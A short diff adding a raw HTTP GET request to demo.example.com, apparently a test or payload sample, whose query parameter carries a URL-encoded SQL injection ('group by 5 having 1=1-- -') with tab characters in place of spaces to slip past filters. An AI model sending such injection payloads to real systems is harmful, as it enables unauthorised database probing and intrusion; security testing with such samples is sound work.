@@ -1,0 +1,4 @@
+GET /a?s=1%09group%09by%095%09having%091%3D1--%09- HTTP/1.1
+Host: demo.example.com
+Connection: close
+
